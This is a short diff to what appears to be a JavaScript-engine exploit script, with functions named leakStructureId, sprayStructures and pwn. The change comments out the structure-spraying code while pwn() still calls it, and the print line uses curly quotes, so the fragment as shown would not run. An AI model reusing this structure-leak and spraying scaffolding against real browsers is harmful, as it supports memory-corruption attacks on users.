@@ -197,7 +197,7 @@ function leakStructureId(victimObj) {
 
     return structureId.match(/.{1,2}/g).map(x => "0x" + x).reverse();
 }
-
+/*
 var structs = [];
 
 function sprayStructures() {
@@ -208,7 +208,7 @@ function sprayStructures() {
         structs.push(a);
     }
 }
-
+*/
 function pwn() {
     print(“starting”);
     sprayStructures();
